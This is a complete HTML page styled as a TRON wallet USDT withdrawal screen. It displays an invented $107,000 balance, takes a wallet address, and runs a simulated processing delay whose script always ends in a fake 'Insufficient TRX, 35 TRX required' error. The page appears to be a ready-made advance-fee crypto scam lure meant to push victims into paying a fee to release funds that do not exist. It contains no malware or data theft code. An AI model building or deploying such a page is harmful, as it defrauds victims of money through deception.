<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>TRON USDT Withdrawal</title>
  <style>
    :root {
      --tron-red: #ff2d55;
      --bg-dark: #0b0f14;
      --card-bg: #121820;
      --text: #eaf1f8;
      --muted: #9fb3c8;
      --error: #ff5c5c;
    }

    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: var(--bg-dark);
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 16px;
    }

    .card {
      background: var(--card-bg);
      border-radius: 16px;
      padding: 24px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
    }

    .logo {
      font-size: 22px;
      font-weight: 800;
      color: var(--tron-red);
      margin-bottom: 12px;
    }

    h1 {
      font-size: 20px;
      margin-bottom: 12px;
      color: var(--tron-red);
    }

    .balance {
      font-size: 16px;
      margin-bottom: 12px;
      color: var(--muted);
    }

    .amount {
      font-size: 18px;
      margin-bottom: 16px;
    }

    .loader {
      width: 64px;
      height: 64px;
      border: 6px solid rgba(255,255,255,0.1);
      border-top: 6px solid var(--tron-red);
      border-radius: 50%;
      margin: 20px auto;
      animation: spin 1s linear infinite;
      display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .btn {
      appearance: none;
      border: none;
      background: var(--tron-red);
      color: white;
      padding: 12px 16px;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 6px 18px rgba(255,45,85,0.25);
      margin-top: 12px;
      width: 100%;
    }

    .form-box {
      display: none;
      margin-top: 16px;
      text-align: left;
    }

    .form-box label {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 4px;
      display: block;
    }

    .form-box input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #2a3746;
      background: #0e141b;
      color: var(--text);
      margin-bottom: 12px;
      font-size: 15px;
    }

    .error {
      display: none;
      margin-top: 20px;
      padding: 14px;
      background: rgba(255,92,92,0.1);
      border: 1px solid var(--error);
      border-radius: 8px;
      color: var(--error);
      font-size: 14px;
      text-align: left;
    }

    .tx-info {
      display: none;
      margin-top: 16px;
      font-size: 14px;
      text-align: left;
      background: rgba(255,255,255,0.05);
      padding: 12px;
      border-radius: 10px;
    }

    .tx-info strong {
      color: var(--tron-red);
    }

    @media (max-width: 480px) {
      h1 { font-size: 18px; }
      .amount { font-size: 16px; }
      .btn { font-size: 15px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">TRON Wallet</div>
    <h1>USDT Withdrawal</h1>
    <div class="balance">Available Balance: $107,000</div>
    <div class="amount">Maximum Withdrawal: <strong>107,000 USDT</strong></div>
    <button class="btn" id="withdrawBtn">Withdraw</button>

    <div class="form-box" id="formBox">
      <label for="walletAddress">USDT Wallet Address</label>
      <input type="text" id="walletAddress" placeholder="Enter your USDT wallet address" />
      <button class="btn" id="confirmBtn">Confirm Withdrawal</button>
    </div>

    <div class="loader" id="loader"></div>

    <div class="error" id="errorBox">
      ⚠️ Transaction Error: Insufficient TRX.<br />
      Immediate release requires <strong>35 TRX</strong>.
    </div>

    <div class="tx-info" id="txInfo">
      <div><strong>Status:</strong> Locked</div>
      <div><strong>TXID:</strong> Locked</div>
      <div><strong>Message:</strong> Insufficient TRX – 35 TRX required</div>
    </div>
  </div>

  <script>
    const withdrawBtn = document.getElementById('withdrawBtn');
    const formBox = document.getElementById('formBox');
    const confirmBtn = document.getElementById('confirmBtn');
    const loader = document.getElementById('loader');
    const errorBox = document.getElementById('errorBox');
    const txInfo = document.getElementById('txInfo');

    withdrawBtn.addEventListener('click', () => {
      withdrawBtn.style.display = 'none';
      formBox.style.display = 'block';
    });

    confirmBtn.addEventListener('click', () => {
      const address = document.getElementById('walletAddress').value.trim();
      if (!address) {
        alert("Please enter your USDT wallet address.");
        return;
      }

      formBox.style.display = 'none';
      loader.style.display = 'block';

      // Simulate 4–7 second transaction processing
      const delay = Math.floor(Math.random() * (7000 - 4000 + 1)) + 4000;
      setTimeout(() => {
        loader.style.display = 'none';
        errorBox.style.display = 'block';
        txInfo.style.display = 'block';
      }, delay);
    });
  </script>
</body>
</html>
